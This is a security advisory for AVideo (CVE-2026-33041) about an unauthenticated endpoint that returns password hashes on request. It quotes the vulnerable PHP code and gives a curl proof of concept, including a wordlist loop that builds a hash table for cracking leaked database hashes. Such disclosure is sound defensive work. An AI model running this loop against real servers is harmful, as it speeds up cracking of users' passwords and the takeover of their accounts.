# [M] AVideo has an Unauthenticated Password Hash Oracle via encryptPass.json.php

## Summary
Severity: Medium
Advisory: GHSA-px7x-gq96-rmp5
CVE: CVE-2026-33041
CWE: CWE-200
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-px7x-gq96-rmp5
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

`/objects/encryptPass.json.php` exposes the application's password hashing algorithm to any unauthenticated user. An attacker can submit arbitrary passwords and receive their hashed equivalents, enabling offline password cracking against leaked database hashes.

### Details

**File:** `objects/encryptPass.json.php`

```php
$obj->password = @$_REQUEST['pass'];
$obj->encryptedPassword = encryptPassword($obj->password);
echo json_encode($obj);
```

No authentication is required. The `encryptPassword()` function in `objects/functions.php` (line ~2101) uses:

```php
function encryptPassword($password, $noSalt = false) {
    if (!empty($advancedCustomUser->encryptPasswordsWithSalt) && !empty($global['salt']) && empty($noSalt)) {
        $password .= $global['salt'];
    }
    return md5(hash('whirlpool', sha1($password)));
}
```

By default, salt is NOT enabled (`encryptPasswordsWithSalt` is off), making the hash deterministic and identical to what's stored in the database.

### PoC

```bash
# Get the hash for any password
curl 'https://TARGET/objects/encryptPass.json.php?pass=admin123'
# Response: {"password":"admin123","encryptedPassword":"<hash>"}

# Build a rainbow table for common passwords
for pass in $(cat rockyou-top1000.txt); do
  curl -s "https://TARGET/objects/encryptPass.json.php?pass=$pass"
done
```

If an attacker obtains password hashes from the database (via SQL injection, backup exposure, etc.), they can instantly crack them by comparing against pre-computed hashes from this endpoint.

### Impact

**Password Cracking Acceleration** — This endpoint eliminates the need for an attacker to reverse-engineer the hashing algorithm. Combined with the weak hash chain (md5+whirlpool+sha1, no salt by default), an attacker with access to database hashes can crack passwords extremely quickly.

Additionally, this reveals whether salt is enabled and the exact hashing implementation, which is sensitive cryptographic configuration.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-px7x-gq96-rmp5
- https://nvd.nist.gov/vuln/detail/CVE-2026-33041
- https://github.com/WWBN/AVideo/commit/ea2efd04464560cca93c9ab48b445dbb944a4e46
- https://github.com/WWBN/AVideo
